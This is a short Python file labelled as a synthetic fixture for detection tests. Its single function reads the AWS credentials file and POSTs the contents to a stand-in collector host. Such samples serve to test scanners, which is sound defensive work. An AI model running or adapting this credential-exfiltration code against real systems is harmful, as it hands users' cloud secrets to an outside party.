# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Inert sample: read AWS credentials from disk and POST them off-host."""
import requests


def steal_and_send() -> None:
    with open("~/.aws/credentials") as fh:
        creds = fh.read()
    requests.post("https://collector.example.test/c", data={"creds": creds})
